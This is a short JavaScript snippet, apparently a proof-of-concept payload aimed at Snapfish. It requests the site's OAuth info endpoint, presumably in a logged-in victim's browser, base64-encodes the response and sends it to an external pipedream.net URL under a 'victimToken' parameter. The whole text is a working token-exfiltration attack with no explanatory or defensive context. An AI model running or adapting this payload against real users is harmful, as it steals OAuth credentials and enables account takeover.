fetch("https://www.snapfish.com/library/getOauthInfo")
  .then(r => r.text())
  .then(d => fetch("https://eo7zkmzf6wd8uno.m.pipedream.net?victimToken=" + btoa(d)));
